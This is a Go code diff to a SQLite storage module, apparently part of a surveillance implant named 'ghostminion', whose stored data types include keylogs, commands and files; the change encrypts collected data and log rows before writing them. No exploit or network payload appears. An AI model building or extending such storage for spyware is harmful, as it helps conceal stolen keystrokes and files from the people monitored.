@@ -4,13 +4,13 @@ import (
 	"database/sql"
 	"errors"
 	"fmt"
+	"ghostminion/cryptography"
 	_ "modernc.org/sqlite"
 	"os"
 	"time"
 )
 
 const (
-	ImagesDataType      = "images"
 	FilesDataType       = "files"
 	CommandsDataType    = "commands"
 	KeylogsDataType     = "keylogs"
@@ -108,8 +108,20 @@ func RemoveOneRow(table string, requestID string) error {
 }
 
 func WriteDataRow(requestID string, dataType string, data []byte) error {
-	// encrypt data
-	query := fmt.Sprintf("INSERT INTO data (request_id, data, data_type, exec_time) VALUES (?, ?, ?, ?)")
-	_, err := dbInstance.Exec(query, requestID, data, dataType, time.Now())
+	data, err := cryptography.EncryptData(data)
+	if err != nil {
+		return err
+	}
+	query := "INSERT INTO data (request_id, data, data_type) VALUES (?, ?, ?)"
+	_, err = dbInstance.Exec(query, requestID, data, dataType)
+	return err
+}
+
+func WriteLogRow(level string, message []byte) error {
+	message, err := cryptography.EncryptData(message)
+	if err != nil {
+		return err
+	}
+	_, err = dbInstance.Exec("INSERT INTO logs (message, level) VALUES (?, ?)", message, level)
 	return err
 }
